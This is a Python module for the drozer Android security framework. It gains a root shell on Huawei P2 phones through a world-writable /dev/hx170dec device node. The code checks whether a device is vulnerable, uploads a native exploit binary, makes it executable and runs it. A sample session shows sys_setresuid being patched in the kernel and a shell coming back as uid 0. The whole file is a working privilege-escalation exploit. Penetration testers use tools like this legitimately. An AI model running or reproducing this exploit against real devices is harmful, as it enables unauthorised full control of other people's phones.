import os

from drozer.modules import common, Module

class HuaweiP2(Module, common.Vulnerability, common.Shell, common.FileSystem, common.ClassLoader):

    name = "Obtain a root shell on a Huawei P2."
    description = """Escalate privileges to root on Huawei P2 devices.

This module uses the vulnerability and exploit provided in http://forum.xda-developers.com/showthread.php?p=35469999

The provided exploit makes use of the fact that /dev/hx170dec is marked as globally RW and so can be exploited from the context of any application to obtain a root shell on the device.
"""
    examples = """
    dz> run exploit.root.huaweip2
    [*] Uploading huaweip2-abuse
    [*] Upload successful
    [*] chmod 770 huaweip2-abuse
    [*] s_show->seq_printf format string found at: 0xC079E284
    [*] sys_setresuid found at 0xC0094588
    [*] patching sys_setresuid at 0xC00945CC
    u0_a95@android:/data/data/com.mwr.dz # id
    uid=0(root) gid=10095(u0_a95) groups=1028(sdcard_r),3003(inet)
    """

    author = ["@mwrlabs", "alephzain (xdadevelopers)"]
    date = "2014-11-05"
    license = "BSD (3 clause)"
    path = ["exploit", "root"]
    
    def isVulnerable(self, arguments):
        
        if "rwx " in self.shellExec("ls -l /dev/hx170dec"):
            return True
        else:
            return False

    def exploit(self, arguments):

        huawei_abuse = os.path.join(self.workingDir(), "huaweip2-abuse")

        # Remove if it is there
        self.shellExec("rm %s" % huawei_abuse)
        
        # Upload the exploit
        self.stdout.write("[*] Uploading huaweip2-abuse\n")
        length = self.uploadFile(os.path.join(os.path.dirname(__file__), "huaweip2-abuse", "libs", "armeabi", "huaweip2-abuse"), huawei_abuse)

        # Open shell and execute
        if length != None:
            self.stdout.write("[*] Upload successful\n")
            self.stdout.write("[*] chmod 770 %s\n" % huawei_abuse)
            self.shellExec("chmod 770 %s" % huawei_abuse)
            
            self.shellStart(huawei_abuse)
        else:
            self.stderr.write("[*] Could not upload file\n")
